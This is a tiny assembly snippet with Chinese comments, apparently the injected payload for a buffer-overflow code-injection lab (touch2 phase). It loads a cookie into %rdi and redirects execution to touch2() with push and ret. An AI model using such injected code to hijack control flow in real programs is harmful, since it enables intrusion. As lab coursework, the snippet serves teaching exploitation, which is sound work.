# 易犯错！立即数不要忘记加'$'
movl     $0x59b997fa, %edi	# 把cookie存进%rdi寄存器中
pushq    $0x4017ec			# 把函数touch2()的地址压栈
ret							# 返回，即跳转到touch2()